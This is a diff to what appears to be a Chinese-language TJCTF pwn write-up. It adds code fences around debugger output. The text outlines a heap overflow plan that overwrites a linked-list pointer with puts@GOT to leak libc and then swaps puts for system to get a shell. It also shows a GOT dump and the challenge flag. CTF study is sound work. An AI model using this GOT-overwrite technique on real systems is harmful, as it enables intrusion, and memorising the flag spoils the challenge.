@@ -3,6 +3,7 @@
     struct event *next;
 名字长度256，有溢出，把next改为puts_got,泄漏libc，改puts为system
 # debug
+```
 [0x404000] free@GLIBC_2.2.5 -> 0x401030 ◂— endbr64
 [0x404008] puts@GLIBC_2.2.5 -> 0x7fafe759cbe0 (puts) ◂— endbr64
 [0x404010] __stack_chk_fail@GLIBC_2.4 -> 0x401050 ◂— endbr64
@@ -20,7 +21,7 @@
     00000040  28 31 2d 32  34 29 20                               │(1-2│4) │
     00000047
 3881421792:00 - \xaf\x7f
-
+```
 # getshell
 tjctf{i_h0pe_my_tre3s_ar3nt_b4d_too}
 ![](https://r2.20161023.xyz/pic/20250608025242617.png)
